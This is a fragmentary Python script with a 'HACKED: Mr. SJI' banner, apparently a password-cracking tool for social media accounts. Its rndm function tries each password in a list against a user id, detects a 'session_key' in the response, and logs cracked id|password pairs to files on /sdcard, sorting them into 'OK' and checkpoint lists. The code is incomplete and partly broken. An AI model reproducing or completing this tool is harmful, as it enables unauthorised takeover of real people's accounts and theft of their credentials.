...
| '--------------' || '--------------' || '--------------' |
 ----------------'  '----------------'  '----------------'
     ...
     │ [💸] my Love_(i)       │
     │ [💸] VERSION  : A.3                   │
     │ [💸] HACKED   : \033[1;32mMr. SJI \033[1;37m              │
     └───────────────────────────────────────┘""")
def linex():
        print(50*'_')
def clear():
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Mr.SJI-EXPART] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SJI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SJI-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;123m [SJI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SJI-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
